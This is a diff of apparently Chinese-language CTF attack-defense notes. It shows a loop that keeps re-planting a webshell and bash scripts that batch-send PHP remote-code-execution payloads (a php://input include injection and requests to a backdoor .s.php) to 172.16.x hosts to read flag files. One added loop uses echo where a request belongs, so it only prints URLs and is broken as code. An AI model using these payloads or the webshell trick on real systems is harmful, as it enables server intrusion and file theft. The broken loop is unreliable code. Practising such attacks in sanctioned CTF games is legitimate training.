@@ -388,15 +388,19 @@ while (true);do echo test >/var/www/html/shell.php;done &
 #### if题目要求只提交flag：
 批量GET FLAG：
 ```
+//变量名外面的花括号是可选的，加花括号是为了帮助解释器识别变量的边界，防止这种：$i123,要写成${i}123
+for i in {1..110};do echo 172.16.${i}.234/.222.php -d "1=system('cat /fla*;echo  ');" --max-time 2;done|grep 172.16
+```
+```
 #!/bin/bash
 for i in {1..3}
 do
 	for h in {1..3}
 	do
 		echo flag80$i$h
-		curl 172.16.2.234:80$i$h/include.php?filename=php://input --data "<?php system('cat /flag.txt');?>" --max-time 3 -s
+		curl 172.16.2.234:80${i}${h}/include.php?filename=php://input --data "<?php system('cat /flag.txt');?>" --max-time 3 -s
 		echo flag80$i$h
-		curl 172.16.2.234:80$i$h/.s.php --data "1=system('cat /flag.txt');" --max-time 3 -s
+		curl 172.16.2.234:80${i}${h}/.s.php --data "1=system('cat /flag.txt');" --max-time 3 -s
 		echo flag80$i$h
 	done
 done
